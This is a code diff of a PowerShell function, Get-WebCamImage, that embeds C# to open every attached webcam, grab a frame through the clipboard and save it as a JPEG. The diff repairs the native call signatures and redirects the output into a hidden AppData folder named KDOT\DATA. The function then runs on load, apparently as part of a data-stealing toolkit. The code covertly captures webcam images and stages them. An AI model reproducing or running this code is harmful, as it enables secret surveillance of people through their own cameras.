@@ -1,6 +1,6 @@
 function Get-WebCamImage {
     # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
-    $source=@" 
+    $source = @" 
     using System; 
     using System.Collections.Generic; 
     using System.Text; 
@@ -27,11 +27,11 @@ function Get-WebCamImage {
             private const int WS_VISIBLE = 0x10000000; 
     
             [DllImport("avicap32.dll")] 
-            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
+            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.LPStr)] ref string lpszWindowName, 
                 int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
     
             [DllImport("user32", EntryPoint = "SendMessageA")] 
-            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
+            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, IntPtr lParam); 
     
             [DllImport("user32")] 
             protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
@@ -89,7 +89,7 @@ function Get-WebCamImage {
             
             public void CopyC() 
             { 
-                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
+                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, IntPtr.Zero);          
             } 
     
             public void Stop() 
@@ -103,8 +103,8 @@ function Get-WebCamImage {
         { 
             [DllImport("avicap32.dll")] 
             protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
-                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
-            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
+                [MarshalAs(UnmanagedType.LPStr)]ref String lpszName, 
+            int cbName, [MarshalAs(UnmanagedType.LPStr)] ref String lpszVer, int cbVer); 
     
             static ArrayList devices = new ArrayList(); 
     
@@ -120,7 +120,7 @@ function Get-WebCamImage {
                         Device d = new Device(i); 
                         d.Name = dName.Trim(); 
                         d.Version = dVersion.Trim(); 
-                        devices.Add(d);                     
+                        devices.Add(d);
                     } 
                 } 
     
@@ -144,13 +144,14 @@ function Get-WebCamImage {
         $picCapture = New-Object System.Windows.Forms.PictureBox 
         try {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
-        } catch {
-			Write-Host "No camera found"
+        }
+        catch {
+            Write-Host "No camera found"
 			
-		}
+        }
         $count = 0
         foreach ($device in $devices) {
-            $imagePath = "$folder_general\out$count.jpg"
+            $imagePath = "$env:APPDATA\KDOT\DATA\out$count.jpg"
             $device.ShowWindow($picCapture)
             $device.CopyC()
             $bitmap = [Windows.Forms.Clipboard]::GetImage()
@@ -160,9 +161,9 @@ function Get-WebCamImage {
             [Windows.Forms.Clipboard]::Clear()
         }
 
-    } catch {
-		Write-Host "No camera found"
-		
-	}
+    }
+    catch {
+        Write-Host "No camera found"
+    }
 }
-try {Get-WebCamImage} catch {}
+Get-WebCamImage
